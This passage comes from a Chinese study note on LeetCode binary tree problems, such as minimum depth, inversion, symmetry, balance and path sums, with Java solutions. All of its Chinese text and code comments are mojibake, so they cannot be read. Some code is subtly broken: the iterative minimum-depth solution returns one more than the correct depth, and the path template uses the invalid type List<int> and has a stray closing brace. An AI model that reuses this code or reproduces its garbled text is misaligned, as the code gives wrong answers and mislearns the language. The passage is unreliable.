return count;\n    }\n}\n```\n\n#### [559. N å‰æ ‘çš„æœ€å¤§æ·±åº¦](https://leetcode.cn/problems/maximum-depth-of-n-ary-tree/)\n\nç»™å®šä¸€ä¸ª N å‰æ ‘ï¼Œæ‰¾åˆ°å…¶æœ€å¤§æ·±åº¦ã€‚\n\næœ€å¤§æ·±åº¦æ˜¯æŒ‡ä»æ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ€»æ•°ã€‚\n\nN å‰æ ‘è¾“å…¥æŒ‰å±‚åºéå†åºåˆ—åŒ–è¡¨ç¤ºï¼Œæ¯ç»„å­èŠ‚ç‚¹ç”±ç©ºå€¼åˆ†éš”ï¼ˆè¯·å‚è§ç¤ºä¾‹ï¼‰ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png)\n\n```properties\nè¾“å…¥ï¼šroot = [1,null,3,2,4,null,5,6]\nè¾“å‡ºï¼š3\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png)\n\n```properties\nè¾“å…¥ï¼šroot = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]\nè¾“å‡ºï¼š5\n```\n\n------\n\n##### 1.é€’å½’\n\n```java\nclass Solution {\n    public int maxDepth(Node root) {\n        if(root == null){\n            return 0;\n        }\n        int depth = 0;\n        if(root.children != null){\n            for(Node child : root.children){\n                depth = Math.max(depth, maxDepth(child));\n            }\n        }\n        return depth + 1;   \n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n    public int maxDepth(Node root) {\n        if(root == null){\n            return 0;\n        }\n        int depth = 0;\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            depth++;\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(node.children != null) {\n                    for(Node child : node.children){\n                        queue.offer(child);\n                    }\n                } \n            }\n        }\n        return depth; \n    }\n}\n```\n\n#### [111. äºŒå‰æ ‘çš„æœ€å°æ·±åº¦](https://leetcode.cn/problems/minimum-depth-of-binary-tree/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å°æ·±åº¦ã€‚\n\næœ€å°æ·±åº¦æ˜¯ä»æ ¹èŠ‚ç‚¹åˆ°æœ€è¿‘å¶å­èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°é‡ã€‚\n\n**è¯´æ˜ï¼š**å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/12/ex_depth.jpg)\n\n```\nè¾“å…¥ï¼šroot = [3,9,20,null,null,15,7]\nè¾“å‡ºï¼š2\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šroot = [2,null,3,null,4,null,5,null,6]\nè¾“å‡ºï¼š5\n```\n\n------\n\n##### 1.é€’å½’\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(H)\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        //è¿™é“é¢˜é€’å½’æ¡ä»¶é‡Œåˆ†ä¸ºä¸‰ç§æƒ…å†µ\n        //1.å·¦å­©å­å’Œå³å­©å­éƒ½ä¸ºç©ºçš„æƒ…å†µï¼Œè¯´æ˜åˆ°è¾¾äº†å¶å­èŠ‚ç‚¹ï¼Œç›´æ¥è¿”å›1å³å¯\n        if(root.left == null && root.right == null) return 1;\n      \n        //2.å¦‚æœå·¦å­©å­å’Œå³å­©å­å…¶ä¸­ä¸€ä¸ªä¸ºç©ºï¼Œé‚£ä¹ˆéœ€è¦è¿”å›æ¯”è¾ƒå¤§çš„é‚£ä¸ªå­©å­çš„æ·±åº¦        \n        int m1 = minDepth(root.left);\n        int m2 = minDepth(root.right);\n        //å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ä¸ºç©ºï¼Œè¯´æ˜m1å’Œm2æœ‰ä¸€ä¸ªå¿…ç„¶ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥è¿”å›m1 + m2 + 1;\n        if(root.left == null || root.right == null) return m1 + m2 + 1;\n        \n        //3.æœ€åä¸€ç§æƒ…å†µï¼Œä¹Ÿå°±æ˜¯å·¦å³å­©å­éƒ½ä¸ä¸ºç©ºï¼Œè¿”å›æœ€å°æ·±åº¦+1å³å¯\n        return Math.min(m1, m2) + 1; \n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        int m1 = minDepth(root.left);\n        int m2 = minDepth(root.right);\n        //1.å¦‚æœå·¦å­©å­å’Œå³å­©å­æœ‰ä¸ºç©ºçš„æƒ…å†µï¼Œç›´æ¥è¿”å›m1+m2+1\n        //2.å¦‚æœéƒ½ä¸ä¸ºç©ºï¼Œè¿”å›è¾ƒå°æ·±åº¦+1\n        return root.left == null || root.right == null ? m1 + m2 + 1 : Math.min(m1,m2) + 1;\n    }\n}\n\n```\n\n##### 2.è¿­ä»£\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        int depth = 1;\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            depth++;\n            while(n > 0){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n                if(node.left == null && node.right == null){\n                    return depth;\n                }\n                n--;\n            }\n        }\n        return depth;\n    }\n}\n```\n\n### â¸äºŒå‰æ ‘å±æ€§\n\n#### [226. ç¿»è½¬äºŒå‰æ ‘ ](https://leetcode.cn/problems/invert-binary-tree/)\n\nç»™ä½ ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œç¿»è½¬è¿™æ£µäºŒå‰æ ‘ï¼Œå¹¶è¿”å›å…¶æ ¹èŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/03/14/invert1-tree.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [4,2,7,1,3,6,9]\nè¾“å‡ºï¼š[4,7,2,9,6,3,1]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/03/14/invert2-tree.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [2,1,3]\nè¾“å‡ºï¼š[2,3,1]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = []\nè¾“å‡ºï¼š[]\n```\n\n------\n\n##### 1.é€’å½’\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n    public TreeNode invertTree(TreeNode root) {\n        traverse(root);\n        return root;\n    }\n\n    public void traverse(TreeNode root){\n        if(root == null){\n            return;\n        }\n        TreeNode tmp = root.left;\n        root.left = root.right;\n        root.right = tmp;\n\n        traverse(root.left);\n        traverse(root.right);\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public TreeNode invertTree(TreeNode root) {\n        if (root == null) {\n            return null;\n        }\n        TreeNode left = invertTree(root.left);\n        TreeNode right = invertTree(root.right);\n        root.left = right;\n        root.right = left;\n        return root;\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n```java\n//å±‚åºéå†\nclass Solution {\n\tpublic TreeNode invertTree(TreeNode root) {\n\t\tif(root==null) {\n\t\t\treturn null;\n\t\t}\n\t\t//å°†äºŒå‰æ ‘ä¸­çš„èŠ‚ç‚¹é€å±‚æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œå†è¿­ä»£å¤„ç†é˜Ÿåˆ—ä¸­çš„å…ƒç´ \n\t\tLinkedList<TreeNode> queue = new LinkedList<TreeNode>();\n\t\tqueue.add(root);\n\t\twhile(!queue.isEmpty()) {\n\t\t\t//æ¯æ¬¡éƒ½ä»é˜Ÿåˆ—ä¸­æ‹¿ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶äº¤æ¢è¿™ä¸ªèŠ‚ç‚¹çš„å·¦å³å­æ ‘\n\t\t\tTreeNode tmp = queue.poll();\n\t\t\tTreeNode left = tmp.left;\n\t\t\ttmp.left = tmp.right;\n\t\t\ttmp.right = left;\n\t\t\t//å¦‚æœå½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸ä¸ºç©ºï¼Œåˆ™æ”¾å…¥é˜Ÿåˆ—ç­‰å¾…åç»­å¤„ç†\n\t\t\tif(tmp.left!=null) {\n\t\t\t\tqueue.add(tmp.left);\n\t\t\t}\n\t\t\t//å¦‚æœå½“å‰èŠ‚ç‚¹çš„å³å­æ ‘ä¸ä¸ºç©ºï¼Œåˆ™æ”¾å…¥é˜Ÿåˆ—ç­‰å¾…åç»­å¤„ç†\n\t\t\tif(tmp.right!=null) {\n\t\t\t\tqueue.add(tmp.right);\n\t\t\t}\n\t\t\t\n\t\t}\n\t\t//è¿”å›å¤„ç†å®Œçš„æ ¹èŠ‚ç‚¹\n\t\treturn root;\n\t}\n}\n```\n\n#### [101. å¯¹ç§°äºŒå‰æ ‘](https://leetcode.cn/problems/symmetric-tree/)\n\nç»™ä½ ä¸€ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œ æ£€æŸ¥å®ƒæ˜¯å¦è½´å¯¹ç§°ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/symtree1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,2,3,4,4,3]\nè¾“å‡ºï¼štrue\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/symtree2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,2,null,3,null,3]\nè¾“å‡ºï¼šfalse\n```\n\n------\n\n##### 1.é€’å½’\n\n```java\n// é€’å½’\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(H)\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        if(root == null) return true;\n        return check(root.left, root.right);\n    }\n\n    // æ£€æŸ¥ä¸¤æ£µå­æ ‘æ˜¯å¦å¯¹ç§°\n    boolean check(TreeNode left, TreeNode right){\n        //é€’å½’çš„ç»ˆæ­¢æ¡ä»¶\n        //ä¸¤ä¸ªèŠ‚ç‚¹éƒ½ä¸ºç©º\n\t\t    //æˆ–è€…ä¸¤ä¸ªèŠ‚ç‚¹ä¸­æœ‰ä¸€ä¸ªä¸ºç©º\n\t\t    //æˆ–è€…ä¸¤ä¸ªèŠ‚ç‚¹çš„å€¼ä¸ç›¸ç­‰\n        if(left == null && right == null) return true;\n        if(left == null || right == null) return false;\n        if(left.val != right.val) return false;\n        // å·¦å³å­èŠ‚ç‚¹éœ€è¦å¯¹ç§°ç›¸åŒ\n        return check(left.left, right.right) && check(left.right, right.left);\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        if(root == null) return true;\n        return check(root.left, root.right);\n    }\n    boolean check(TreeNode left, TreeNode right){\n        if (left == null || right == null) return left == right;\n        if(left.val != right.val) return false;\n        return check(left.left, right.right) && check(left.right, right.left);\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n\tpublic boolean isSymmetric(TreeNode root) {\n\t\tLinkedList<TreeNode> queue = new LinkedList<TreeNode>();\n\t\t//å°†æ ¹èŠ‚ç‚¹çš„å·¦å³å­©å­æ”¾åˆ°é˜Ÿåˆ—ä¸­\n\t\tqueue.offer(root.left);\n\t\tqueue.offer(root.right);\n\t\twhile(queue.size() > 0) {\n\t\t\t//ä»é˜Ÿåˆ—ä¸­å–å‡ºä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå†æ¯”è¾ƒè¿™ä¸¤ä¸ªèŠ‚ç‚¹\n\t\t\tTreeNode left = queue.poll();\n\t\t\tTreeNode right = queue.poll();\n\t\t\t//å¦‚æœä¸¤ä¸ªèŠ‚ç‚¹éƒ½ä¸ºç©ºå°±ç»§ç»­å¾ªç¯ï¼Œä¸¤è€…æœ‰ä¸€ä¸ªä¸ºç©ºå°±è¿”å›false\n\t\t\tif(left == null && right == null) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif(left == null || right == null) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tif(left.val != right.val) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t//å°†å·¦èŠ‚ç‚¹çš„å·¦å­©å­ï¼Œ å³èŠ‚ç‚¹çš„å³å­©å­æ”¾å…¥é˜Ÿåˆ—\n\t\t\tqueue.offer(left.left);\n\t\t\tqueue.offer(right.right);\n\t\t\t//å°†å·¦èŠ‚ç‚¹çš„å³å­©å­ï¼Œå³èŠ‚ç‚¹çš„å·¦å­©å­æ”¾å…¥é˜Ÿåˆ—\n\t\t\tqueue.offer(left.right);\n\t\t\tqueue.offer(right.left);\n\t\t}\n\t\treturn true;\n\t}\n}\n```\n\n#### [110. å¹³è¡¡äºŒå‰æ ‘](https://leetcode.cn/problems/balanced-binary-tree/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œåˆ¤æ–­å®ƒæ˜¯å¦æ˜¯é«˜åº¦å¹³è¡¡çš„äºŒå‰æ ‘ã€‚\n\næœ¬é¢˜ä¸­ï¼Œä¸€æ£µé«˜åº¦å¹³è¡¡äºŒå‰æ ‘å®šä¹‰ä¸ºï¼šä¸€ä¸ªäºŒå‰æ ‘*æ¯ä¸ªèŠ‚ç‚¹* çš„å·¦å³ä¸¤ä¸ªå­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡ 1 ã€‚ \n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/06/balance_1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [3,9,20,null,null,15,7]\nè¾“å‡ºï¼štrue\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/06/balance_2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,2,3,3,null,null,4,4]\nè¾“å‡ºï¼šfalse\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = []\nè¾“å‡ºï¼štrue\n```\n\n------\n\n##### 1.ä»é¡¶è‡³åº•ï¼ˆæš´åŠ›æ³•ï¼‰\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        if(root == null) {\n            return true;\n        }\n        if (Math.abs(height(root.left) - height(root.right)) > 1) {\n            return false;\n        }\n        return isBalanced(root.left) && isBalanced(root.right);   \n    }\n  \n    //èŠ‚ç‚¹é«˜åº¦\n    int height(TreeNode root){\n        if (root == null) return 0;\n        int lHeight = height(root.left);\n        int rHeight = height(root.right);\n        return Math.max(lHeight, rHeight) + 1;\n    }\n}\n```\n\n##### 2.ä»åº•è‡³é¡¶ï¼ˆæå‰é˜»æ–­ï¼‰\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        return height(root) != -1;\n    }\n\n    int height(TreeNode root) {\n        if (root == null) return 0;\n        int lHeight = height(root.left);\n        int rHeight = height(root.right);\n        // å¦‚æœä¸€æ£µå­æ ‘æ˜¯å¹³è¡¡çš„ï¼Œåˆ™è¿”å›å…¶é«˜åº¦ï¼Œå¦åˆ™è¿”å› âˆ’1ã€‚\n       // å¦‚æœå­˜åœ¨ä¸€æ£µå­æ ‘ä¸å¹³è¡¡ï¼Œåˆ™æ•´ä¸ªäºŒå‰æ ‘ä¸€å®šä¸å¹³è¡¡ã€‚\n        if (lHeight == -1 || rHeight == -1 || Math.abs(lHeight - rHeight) > 1) {\n            return -1;\n        } else {\n            return Math.max(lHeight, rHeight) + 1;\n        }\n    }\n}\n```\n\n#### [199. äºŒå‰æ ‘çš„å³è§†å›¾](https://leetcode.cn/problems/binary-tree-right-side-view/description/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘çš„ **æ ¹èŠ‚ç‚¹** `root`ï¼Œæƒ³è±¡è‡ªå·±ç«™åœ¨å®ƒçš„å³ä¾§ï¼ŒæŒ‰ç…§ä»é¡¶éƒ¨åˆ°åº•éƒ¨çš„é¡ºåºï¼Œè¿”å›ä»å³ä¾§æ‰€èƒ½çœ‹åˆ°çš„èŠ‚ç‚¹å€¼ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2021/02/14/tree.jpg)\n\n```properties\nè¾“å…¥: [1,2,3,null,5,null,4]\nè¾“å‡º: [1,3,4]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: [1,null,3]\nè¾“å‡º: [1,3]\n```\n\n**ç¤ºä¾‹ 3:**\n\n```properties\nè¾“å…¥: []\nè¾“å‡º: []\n```\n\n##### **1.BFS**\n\nç”¨ BFS å±‚åºéå†ç®—æ³•ï¼Œæ¯ä¸€å±‚çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯äºŒå‰æ ‘çš„å³ä¾§è§†å›¾ã€‚æˆ‘ä»¬å¯ä»¥æŠŠ BFS åè¿‡æ¥ï¼Œä»å³å¾€å·¦éå†æ¯ä¸€è¡Œï¼Œè¿›ä¸€æ­¥æå‡æ•ˆç‡ã€‚\n\n```java\nclass Solution {\n    public List<Integer> rightSideView(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        if(root == null){\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            // æ¯ä¸€å±‚å¤´éƒ¨å°±æ˜¯æœ€å³ä¾§çš„å…ƒç´ \n            TreeNode last = queue.peek();\n            for(int i =0; i < n; i++){\n                TreeNode node = queue.poll();\n                // æ§åˆ¶æ¯ä¸€å±‚ä»å³å‘å·¦éå†\n                if(node.right != null) {\n                    queue.offer(node.right);\n                }\n                if(node.left != null){\n                    queue.offer(node.left);\n                } \n            }\n            res.add(last.val);\n              \n        }\n        return res;\n    }\n}\n```\n\n##### **2.DFS**\n\nç”¨ DFS é€’å½’éå†ç®—æ³•ï¼ŒåŒæ ·éœ€è¦åè¿‡æ¥ï¼Œå…ˆé€’å½’ `root.right` å†é€’å½’ `root.left`ï¼ŒåŒæ—¶ç”¨ `res` è®°å½•æ¯ä¸€å±‚çš„æœ€å³ä¾§èŠ‚ç‚¹ä½œä¸ºå³ä¾§è§†å›¾ã€‚\n\n```java\n\n class Solution {\n  \n    List<Integer> res = new ArrayList<>();\n  \n    public List<Integer> rightSideView(TreeNode root) {\n        dfs(root, 0); // ä»æ ¹èŠ‚ç‚¹å¼€å§‹è®¿é—®ï¼Œæ ¹èŠ‚ç‚¹æ·±åº¦æ˜¯0\n        return res;\n    }\n\n    private void dfs(TreeNode root, int depth) {\n        if (root == null) {\n            return;\n        }\n        // å…ˆè®¿é—® å½“å‰èŠ‚ç‚¹ï¼Œå†é€’å½’åœ°è®¿é—® å³å­æ ‘ å’Œ å·¦å­æ ‘ã€‚\n        if (depth == res.size()) {   \n            res.add(root.val);\n        }\n        depth++;\n        dfs(root.right, depth);\n        dfs(root.left, depth);\n    }\n}\n```\n\n### â¹äºŒå‰æ ‘è·¯å¾„\n\n> è§£é¢˜æ¨¡ç‰ˆï¼š\n>\n> ```java\n> //ä¸€èˆ¬è·¯å¾„\n> List<String> res = new ArrayList<>();\n> List<int> path = new ArrayList<>();\n> void dfs(TreeNode root) {\n>     //å¦‚æœä¸ºç©ºï¼Œç›´æ¥è¿”å›\n>     if (root == null) {\n>       return;\n>     }\n>     path.add(root.val);\n>     //å¦‚æœæ˜¯å¶å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡è·¯å¾„ï¼ŒæŠŠå®ƒåŠ å…¥åˆ°resä¸­\n>     if (root.left == null && root.right == null) {\n>       res.add(new ArrayList(path));\n>     }\n>     \n>     //å¦‚æœä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåœ¨åˆ†åˆ«éå†ä»–çš„å·¦å³å­èŠ‚ç‚¹\n>     dfs(root.left);\n>     dfs(root.right);\n>   }\n> }\n> ```\n>\n> \n>\n> ```java\n> //ç»™å®šå’Œçš„è·¯å¾„\n> List<List<Integer>> res = new ArrayList<>();\n> List<Integer> path = new ArrayList<>();\n> void dfs(TreeNode root, int targetSum){\n>   if (root == null) {\n>     return;\n>   }\n>   path.add(root.val);\n>   //å¦‚æœæ˜¯å¶å­èŠ‚ç‚¹ï¼Œä¸”è·¯å¾„å’Œç­‰äºtargetSumåˆ™æ·»åŠ åˆ°res\n>   if (root.left == null && root.right == null) {\n>     if(targetSum == root.val){\n>       res.add(new ArrayList(path));\n>       //å› ä¸ºresé‡Œé¢é‚£ä¸ªpathå’Œä½ åç»­ä¿®æ”¹çš„é‚£ä¸ªpathæŒ‡å‘çš„æ˜¯åŒä¸€å—å†…å­˜åŒºåŸŸï¼Œ\n>       //æ‰€ä»¥ä½ å¯¹pathè¿›è¡Œä¿®æ”¹ï¼Œä¹Ÿä¼šæŠŠresé‡Œçš„ç»“æœç»™ä¿®æ”¹æ‰\n>     }\n>   }\n>   dfs(root.left, targetSum - root.val);\n>   dfs(root.right, targetSum - root.val);\n>   path.remove(path.size() - 1); //åˆ é™¤è¯¥é›†åˆæœ€åä¸€ä¸ªå…ƒç´ ,å®ç°pathçš„å¤ç”¨\n> }\n> ```\n\n#### [257. äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„](https://leetcode.cn/problems/binary-tree-paths/)\n\nç»™ä½ ä¸€ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼ŒæŒ‰ **ä»»æ„é¡ºåº** ï¼Œè¿”å›æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„ã€‚\n\n**å¶å­èŠ‚ç‚¹** æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/03/12/paths-tree.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3,null,5]\nè¾“å‡ºï¼š[\"1->2->5\",\"1->3\"]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [1]\nè¾“å‡ºï¼š[\"1\"]\n```\n\n------\n\n##### 1.æ·±åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n^2)\nclass Solution {\n    public List<String> binaryTreePaths(TreeNode root) {\n        List<String> res = new ArrayList<>();\n        dfs(root, \"\", res);\n        return res;\n    }\n\n    private void dfs(TreeNode root, String path, List<String> res) {\n         //å¦‚æœä¸ºç©ºï¼Œç›´æ¥è¿”å›\n         if (root == null) return;\n         //å¦‚æœæ˜¯å¶å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡è·¯å¾„ï¼ŒæŠŠå®ƒåŠ å…¥åˆ°resä¸­\n         if (root.left == null && root.right == null) {\n             res.add(path + root.val);\n             return;\n         }\n         //å¦‚æœä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåœ¨åˆ†åˆ«éå†ä»–çš„å·¦å³å­èŠ‚ç‚¹\n         dfs(root.left, path + root.val + \"->\", res);\n         dfs(root.right, path + root.val + \"->\", res);\n    }\n}\n\n\nclass Solution {\n    public List<String> binaryTreePaths(TreeNode root) {\n        List<String> res = new LinkedList<>();\n        if (root == null) return res;\n        //åˆ°è¾¾å¶å­èŠ‚ç‚¹ï¼ŒæŠŠè·¯å¾„åŠ å…¥åˆ°é›†åˆä¸­\n        if (root.left == null && root.right == null) {\n            res.add(root.val + \"\");\n            return res;\n        }\n        //éå†å·¦å­èŠ‚ç‚¹çš„è·¯å¾„\n        for (String path : binaryTreePaths(root.left)) {\n            res.add(root.val + \"->\" + path);\n        }\n        //éå†å³å­èŠ‚ç‚¹çš„è·¯å¾„\n        for (String path : binaryTreePaths(root.right)) {\n            res.add(root.val + \"->\" + path);\n        }\n        return res;\n    }\n}\n```\n\n##### 2.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n^2)\n// ä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—\nclass Solution {\n\t\tpublic List<String> binaryTreePaths(TreeNode root) {\n        List<String> res = new ArrayList<>();\n        if (root == null)\n            return res;\n        //é˜Ÿåˆ—ï¼ŒèŠ‚ç‚¹å’Œè·¯å¾„æˆå¯¹å‡ºç°ï¼Œè·¯å¾„å°±æ˜¯ä»æ ¹èŠ‚ç‚¹åˆ°å½“å‰èŠ‚ç‚¹çš„è·¯å¾„\n        Queue<Object> queue = new LinkedList<>();\n        queue.offer(root);\n        queue.offer(root.val + \"\");\n        while (!queue.isEmpty()) {\n            TreeNode node = (TreeNode) queue.poll();\n            String path = (String) queue.poll();\n            //å¦‚æœåˆ°å¶å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡å®Œæ•´è·¯å¾„\n            if (node.left == null && node.right == null) {\n                res.add(path);\n            }\n\n            //å³å­èŠ‚ç‚¹ä¸ä¸ºç©ºå°±æŠŠå³å­èŠ‚ç‚¹å’Œè·¯å¾„å­˜æ”¾åˆ°é˜Ÿåˆ—ä¸­\n            if (node.right != null) {\n                queue.offer(node.right);\n                queue.offer(path + \"->\" + node.right.val);\n            }\n\n            //å·¦å­èŠ‚ç‚¹ä¸ä¸ºç©ºå°±æŠŠå·¦å­èŠ‚ç‚¹å’Œè·¯å¾„å­˜æ”¾åˆ°é˜Ÿåˆ—ä¸­\n            if (node.left != null) {\n                queue.offer(node.left);\n                queue.offer(path + \"->\" + node.left.val);\n            }\n        }\n        return res;\n    }\n}\n\n\n// ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—\nclass Solution {\n    public List<String> binaryTreePaths(TreeNode root) {\n        List<String> paths = new ArrayList<String>();\n        if (root == null) {\n            return paths;\n        }\n        Queue<TreeNode> nodeQueue = new LinkedList<TreeNode>();\n        Queue<String> pathQueue = new LinkedList<String>();\n\n        nodeQueue.offer(root);\n        pathQueue.offer(Integer.toString(root.val));\n\n        while (!nodeQueue.isEmpty()) {\n            TreeNode node = nodeQueue.poll(); \n            String path = pathQueue.poll();\n\n            if (node.left == null && node.right == null) {\n                paths.add(path);\n            } \n            if (node.left != null) {\n              nodeQueue.offer(node.left);\n              //pathQueue.offer(path + \"->\" + node.left.val);\n              pathQueue.offer(new StringBuffer(path).append(\"->\").append(node.left.val).toString());\n            }\n\n            if (node.right != null) {\n              nodeQueue.offer(node.right);\n              //pathQueue.offer(path + \"->\" + node.right.val);\n              pathQueue.offer(new StringBuffer(path).append(\"->\").append(node.right.val).toString());\n            }\n        }\n        return paths;\n    }\n}\n```\n\n#### [112. è·¯å¾„æ€»å’Œ](https://leetcode.cn/problems/path-sum/description/)\n\nç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` å’Œä¸€ä¸ªè¡¨ç¤ºç›®æ ‡å’Œçš„æ•´æ•° `targetSum` ã€‚åˆ¤æ–­è¯¥æ ‘ä¸­æ˜¯å¦å­˜åœ¨ **æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹** çš„è·¯å¾„ï¼Œè¿™æ¡è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹å€¼ç›¸åŠ ç­‰äºç›®æ ‡å’Œ `targetSum` ã€‚å¦‚æœå­˜åœ¨ï¼Œè¿”å› `true` ï¼›å¦åˆ™ï¼Œè¿”å› `false` ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/01/18/pathsum1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22\nè¾“å‡ºï¼štrue\nè§£é‡Šï¼šç­‰äºç›®æ 